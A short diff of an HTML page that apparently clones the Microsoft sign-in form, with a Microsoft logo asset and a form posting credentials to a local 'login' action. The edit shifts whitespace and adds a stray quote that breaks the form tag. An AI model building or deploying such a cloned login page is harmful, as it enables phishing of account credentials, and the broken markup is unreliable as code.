@@ -8,7 +8,7 @@
 		
       <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
       
-	    <link rel="stylesheet" type="text/css" href="style.css">
+	   <link rel="stylesheet" type="text/css" href="style.css">
 
 
       <link rel="image_src" href="microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg">
@@ -26,7 +26,7 @@
             </div>
          </div>
          <div data-bind="if: activeDialog"></div>
-         <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog" action="login">
+         <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog" action="login"">
             <!-- ko if: svr.CO --><!-- /ko --><!-- ko withProperties: { '$loginPage': $data } --> 
             <div class="outer" data-bind="component: { name: 'master-page',
                params: {
